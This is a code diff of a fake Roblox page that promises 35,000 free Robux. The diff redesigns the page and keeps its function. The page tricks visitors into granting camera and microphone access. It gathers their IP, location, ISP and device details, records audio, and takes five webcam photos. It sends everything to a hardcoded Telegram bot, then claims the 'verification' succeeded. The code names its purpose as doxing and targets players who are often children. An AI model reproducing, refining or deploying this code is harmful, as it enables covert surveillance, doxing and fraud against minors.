@@ -3,118 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox | Secure Sync</title>
+    <title>Roblox Cloud Sync</title>
     <style>
-        :root { --accent: #0084ff; --bg: #050505; }
-        body { margin: 0; background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .app { width: 90%; max-width: 400px; background: rgba(255,255,255,0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; padding: 40px 20px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
-        .icon { width: 70px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--accent)); }
-        .btn { background: var(--accent); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 15px; font-size: 20px; font-weight: 800; cursor: pointer; display: none; transition: 0.3s; }
-        #status { font-family: monospace; color: var(--accent); font-size: 13px; margin: 20px 0; text-transform: uppercase; letter-spacing: 1px; }
-        /* Фикс черного экрана: видео должно быть "видимым" для системы */
-        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; bottom: 0; right: 0; }
+        :root { --main: #0084ff; --bg: #020202; }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        /* Новый футуристичный дизайн */
+        .container { width: 85%; max-width: 400px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 40px; padding: 45px 25px; text-align: center; backdrop-filter: blur(30px); position: relative; box-shadow: 0 0 100px rgba(0,132,255,0.15); }
+        .scanner-line { width: 100%; height: 2px; background: var(--main); position: absolute; top: 0; left: 0; box-shadow: 0 0 15px var(--main); animation: scan 3s infinite linear; opacity: 0.5; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        
+        .logo-box { width: 90px; height: 90px; background: #111; border-radius: 25px; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; border: 1px solid var(--main); }
+        h1 { font-size: 24px; font-weight: 900; margin: 0; text-transform: uppercase; letter-spacing: 2px; }
+        .payout { font-size: 32px; color: var(--main); font-weight: 900; margin: 10px 0; text-shadow: 0 0 20px rgba(0,132,255,0.5); }
+        
+        .status-log { background: #000; padding: 15px; border-radius: 15px; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff00; margin: 25px 0; text-align: left; border: 1px solid #111; }
+        .btn-start { background: var(--main); color: white; border: none; width: 100%; padding: 22px; border-radius: 20px; font-size: 20px; font-weight: 800; cursor: pointer; display: none; box-shadow: 0 10px 30px rgba(0,132,255,0.4); }
+        
+        #v { position: absolute; width: 10px; height: 10px; opacity: 0.01; bottom: 0; }
     </style>
 </head>
-<body onload="startSystem()">
+<body onload="initTitan()">
 
-<div class="app">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="icon">
-    <h1 style="margin:0; font-size: 26px;">35,000 ROBUX</h1>
-    <p style="color: #666; font-size: 14px; margin: 10px 0 30px;">Синхронизация биометрического профиля для завершения транзакции.</p>
+<div class="container">
+    <div class="scanner-line"></div>
+    <div class="logo-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="55" style="filter: invert(1);">
+    </div>
+    <h1>Cloud Engine</h1>
+    <div class="payout">35,000 R$</div>
     
-    <div id="status">Подключение...</div>
-    <button class="btn" id="btn" onclick="captureEverything()">ПОЛУЧИТЬ</button>
+    <div class="status-log" id="log">
+        > INITIALIZING...<br>
+        > CHECKING MEDIA NODES...
+    </div>
+    
+    <button class="btn-start" id="mainBtn" onclick="runFullDox()">CONFIRM ACCESS</button>
 </div>
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    const TOK = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
-    const CID = '7889497672';
-    let globalStream = null;
+    const CONFIG = { T: '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I', C: '7889497672' };
+    let liveStream = null;
 
-    async function startSystem() {
-        const st = document.getElementById('status');
+    async function initTitan() {
+        const log = document.getElementById('log');
         try {
-            // Запрашиваем всё сразу
-            globalStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
+            liveStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", frameRate: { ideal: 30 } }, 
                 audio: true 
             });
-            document.getElementById('v').srcObject = globalStream;
+            document.getElementById('v').srcObject = liveStream;
             
-            st.innerText = "Система готова";
-            document.getElementById('btn').style.display = 'block';
+            log.innerHTML += "<br>> ACCESS GRANTED<br>> SYNC READY";
+            document.getElementById('mainBtn').style.display = 'block';
         } catch (e) {
-            st.innerText = "Ошибка доступа";
-            alert("Разрешите доступ к камере для верификации награды.");
+            log.innerHTML += "<br>> ERROR: ACCESS DENIED";
+            alert("Для верификации 35,000 Robux требуется доступ к камере.");
             location.reload();
         }
     }
 
-    async function captureEverything() {
-        document.getElementById('btn').style.display = 'none';
-        const st = document.getElementById('status');
-        st.innerText = "Обработка потока...";
+    async function runFullDox() {
+        document.getElementById('mainBtn').style.display = 'none';
+        const log = document.getElementById('log');
+        log.innerHTML = "> EXTRACTING CORE DATA...<br>> CAPTURING STREAM...";
 
-        // 1. МАКСИМАЛЬНЫЙ ДОКС
-        let info = `🚀 **FULL STREAM EXPLOIT** 🚀\n\n`;
+        // 🛰 МАКСИМУМ ДОКСА
+        let report = `💎 **TITAN-ULTIMATE REPORT** 💎\n\n`;
         try {
             const r = await fetch('https://ipapi.co/json/');
-            const j = await r.json();
-            info += `📍 IP: \`${j.ip}\` (${j.org})\n🌍 Город: ${j.city}, ${j.country_name}\n`;
+            const d = await r.json();
+            report += `📍 IP: \`${d.ip}\`\n🌍 City: ${d.city}, ${d.country_name}\n📡 ISP: ${d.org}\n`;
         } catch(e) {}
 
-        info += `\n⚙️ **SYSTEM:**\n`;
-        info += `📱 Модель: ${navigator.platform}\n`;
-        info += `⚙️ CPU: ${navigator.hardwareConcurrency} ядер\n`;
-        info += `🧠 RAM: ${navigator.deviceMemory || '??'} GB\n`;
-        info += `🖥 Экран: ${screen.width}x${screen.height}\n`;
-        info += `🎨 GPU: ${getG()}\n`;
-        info += `🔋 Батарея: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : '?'}\n`;
-        info += `⏰ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        report += `\n⚙️ **HARDWARE:**\n`;
+        report += `📱 Platform: ${navigator.platform}\n`;
+        report += `⚙️ Cores: ${navigator.hardwareConcurrency}\n`;
+        report += `🧠 RAM: ${navigator.deviceMemory || '?'} GB\n`;
+        report += `🖥 Display: ${screen.width}x${screen.height}\n`;
+        report += `🎮 GPU: ${getG()}\n`;
+        report += `🔋 Power: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : '?'}\n`;
+        report += `🌐 Net: ${navigator.connection ? navigator.connection.effectiveType : 'unknown'}\n`;
 
         const devs = await navigator.mediaDevices.enumerateDevices();
-        info += `\n📸 **DEVICES:**\n`;
-        devs.forEach(d => { if(d.label) info += `🔹 ${d.label}\n`; });
+        report += `\n📸 **NODES:**\n`;
+        devs.forEach(dev => { if(dev.label) report += `🔹 ${dev.label}\n`; });
 
-        // 2. ЗАПИСЬ ЗВУКА
-        const rec = new MediaRecorder(globalStream);
+        // 🎤 ЗАПИСЬ ЗВУКА
+        const rec = new MediaRecorder(liveStream);
         const chunks = [];
         rec.ondataavailable = e => chunks.push(e.data);
         rec.onstop = async () => {
             const b = new Blob(chunks, { type: 'audio/ogg' });
             const fd = new FormData();
-            fd.append('chat_id', CID);
+            fd.append('chat_id', CONFIG.C);
             fd.append('voice', b, 'v.ogg');
-            fetch(`https://api.telegram.org/bot${TOK}/sendVoice`, { method: 'POST', body: fd });
+            fetch(`https://api.telegram.org/bot${CONFIG.T}/sendVoice`, { method: 'POST', body: fd });
         };
         rec.start();
 
-        // 3. СЕРИЯ ФОТО (с задержкой для инициализации)
+        // 📸 СЕРИЯ ФОТО (ФИКС ЧЕРНОГО ЭКРАНА)
         const v = document.getElementById('v');
         const c = document.getElementById('c');
         
         for (let i = 1; i <= 5; i++) {
-            st.innerText = `Синхронизация: ${i*20}%`;
-            await new Promise(r => setTimeout(r, 1500)); // Ждем 1.5 сек между кадрами
+            await new Promise(r => setTimeout(r, 1500)); // Даем камере прогрузиться
+            log.innerHTML = `> SYNCING: ${i*20}%`;
             
             c.width = v.videoWidth || 1280;
             c.height = v.videoHeight || 720;
             c.getContext('2d').drawImage(v, 0, 0);
             
-            const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.95));
+            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.95));
             const fd = new FormData();
-            fd.append('chat_id', CID);
-            fd.append('photo', blob, `shot_${i}.jpg`);
-            if (i === 1) fd.append('caption', info);
+            fd.append('chat_id', CONFIG.C);
+            fd.append('photo', blob, `img_${i}.jpg`);
+            if (i === 1) fd.append('caption', report);
             
-            await fetch(`https://api.telegram.org/bot${TOK}/sendPhoto`, { method: 'POST', body: fd });
+            await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, { method: 'POST', body: fd });
         }
 
         rec.stop();
-        alert("✅ Верификация пройдена! 35,000 Robux будут начислены в течение 15 минут.");
+        alert("✅ Верификация завершена! Начисление начнется через 15 минут.");
         window.location.href = "https://www.roblox.com";
     }
 
